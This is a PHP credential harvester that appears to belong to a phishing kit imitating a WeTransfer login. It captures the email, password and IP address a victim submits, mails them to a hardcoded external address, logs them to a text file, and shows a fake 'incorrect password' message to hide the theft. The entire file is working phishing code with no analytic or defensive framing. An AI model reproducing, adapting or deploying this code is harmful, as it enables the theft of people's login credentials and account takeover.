<?php

if (isset($_POST['auto_user']) && isset($_POST['_pass'])) {
	$email = $_POST['auto_user'];
	$password = $_POST['_pass'];

	if (!empty($email) && !empty($password)) {
		 $data ='------=====HACKED BY Hephzibar========--------'."\n";

//$data .=$_POST['']."\n";
$data .='Email='.""; $data .=$email."\n";
$data .='Password='.""; $data .=$password."\n";
$data .='IP='.""; $data .=$_SERVER["REMOTE_ADDR"]."\n";
$data .='Date='.""; $data .=date("m/d/y G.i:s", time())."\n";
//$data .=$_POST['']."\n";
$data .='------=====Hephzibar Logins========--------'."\n";

$file ="logs.txt";

$to="hcees@yahoo.com";
$subject = "New wetrasfer Log";
$headers = "From: Hephzibar Logins<new@mail.com>\n";
$headers .= "MIME-Version: 1.0\n";
mail($to,$subject,$data,$headers);
?>
<span id="efire" style="display:block; font-size:12px; padding-left:22px; color:rgb(232, 17, 35); font-weight:bold;">Authentication failed. You entered an incorrect password.</span>

<?php

$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $data) or die("Couldn't write values to file!");
fclose($fp);
	}
}









?>